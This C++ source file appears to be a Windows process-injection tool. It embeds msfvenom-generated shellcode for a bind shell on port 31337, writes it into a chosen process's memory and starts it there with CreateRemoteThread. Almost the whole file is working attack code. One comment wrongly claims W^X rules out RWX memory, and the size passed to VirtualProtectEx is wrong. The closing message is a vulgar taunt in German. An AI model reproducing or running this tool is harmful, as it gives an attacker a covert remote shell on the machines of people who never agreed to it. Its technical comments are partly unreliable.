#include <iostream>
#include <windows.h>
#include <thread>
#include <chrono>

/* Process migration / injection  example
*/

/* Freestanding payload you wanna inject.
** this example is a 64 bit windows tcp bind shell listening on port 31337 created with:
** msfvenom -p windows/x64/shell_bind_tcp EXITFUNC=thread LPORT=31337 -f c --platform windows -a x64
*/
const unsigned char payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
"\x49\x89\xe5\x49\xbc\x02\x00\x7a\x69\x00\x00\x00\x00\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\xc2"
"\xdb\x37\x67\xff\xd5\x48\x31\xd2\x48\x89\xf9\x41\xba\xb7\xe9"
"\x38\xff\xff\xd5\x4d\x31\xc0\x48\x31\xd2\x48\x89\xf9\x41\xba"
"\x74\xec\x3b\xe1\xff\xd5\x48\x89\xf9\x48\x89\xc7\x41\xba\x75"
"\x6e\x4d\x61\xff\xd5\x48\x81\xc4\xa0\x02\x00\x00\x49\xb8\x63"
"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

void usage()
{
	std::cout << "Usage: inject.exe <targetpid>" << std::endl;
	exit(1);
}

int main(int argc, char ** argv)
{
	DWORD	targetPid;				// Target PID
	HANDLE	targetProcess;			// Target process handle
	HANDLE	targetThread;			// Handle for thread we create in target process
	SIZE_T	payloadSize;			
	LPVOID	memAddress;				// Memory address mapped in target process
	SIZE_T	payloadBytesWritten;
	DWORD	oldProtect;				// required return value of VirtualProtectEx
	
	if (argc < 2)
		usage();

	/* get PID from command line
	*/
	targetPid = std::atoi(argv[1]);
	
	/* Attach target process with full spectrum cyber permissions
	** https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess
	*/
	targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
	if (targetProcess == NULL) {
		std::cout << "OpenProcess failed: " << GetLastError() << std::endl;
		return 1;
	}
	
	/* Map memory in target process
	** Notice: PAGE_EXECUTE_READWRITE is not possible since W^X security features are in place
	** https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890(v=vs.85).aspx
	*/
	payloadSize = sizeof(payload);
	memAddress = VirtualAllocEx(targetProcess, NULL, payloadSize, MEM_COMMIT, PAGE_READWRITE);
	if (memAddress == NULL) {
		std::cout << "VirtualAllocEx failed: " << GetLastError() << std::endl;
		return 1;
	} else {
		std::cout << "Allocated memory at address " << memAddress << " in process " << targetPid << std::endl;
	}
	
	/* Copy payload to target process memory
	** https://msdn.microsoft.com/de-de/library/windows/desktop/ms681674(v=vs.85).aspx
	*/
	if (WriteProcessMemory(targetProcess, memAddress, payload, payloadSize, &payloadBytesWritten)) {
		std::cout << "Successfully wrote " << payloadBytesWritten << " bytes to process" << std::endl;
	} else {
		std::cout << "WriteProcessMemory failed: " << GetLastError() << std::endl;
		return 1;
	}
	
	/* Change memory permissions to read+execute since we can only either write or execute
	** https://msdn.microsoft.com/de-de/library/windows/desktop/aa366899(v=vs.85).aspx
	*/
	if (!VirtualProtectEx(targetProcess, memAddress, sizeof(payloadSize), PAGE_EXECUTE_READ, &oldProtect)) {
		std::cout << "VirtualProtectEx failed: " << GetLastError() << std::endl;
		return 1;
	}

	/* Run a thread with our payload aside with the regular process
	** https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread
	*/	
	targetThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memAddress, 0, 0, 0);
	if (targetThread == NULL) {
		std::cout << "CreateRemoteThread failed: " << GetLastError() << std::endl;
		return 1;
	} else {
		std::cout << "Thread started, jetzt connect zu deiner bindshell und wichs dir einen..." << std::endl;
	}
	
	return 0;
}

